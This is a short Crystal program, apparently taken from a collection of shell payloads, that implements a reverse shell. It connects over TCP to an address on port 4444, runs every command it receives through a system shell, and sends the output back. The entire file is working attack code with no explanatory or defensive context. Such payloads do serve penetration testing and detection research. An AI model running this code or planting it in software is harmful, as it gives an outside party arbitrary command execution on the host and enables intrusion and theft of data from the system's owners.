require "process"
require "socket"

c = Socket.tcp(Socket::Family::INET)
c.connect("0.0.0.0", 4444)
loop do 
  m, l = c.receive
  p = Process.new(m.rstrip("\n"), output:Process::Redirect::Pipe, shell:true)
  c << p.output.gets_to_end
end
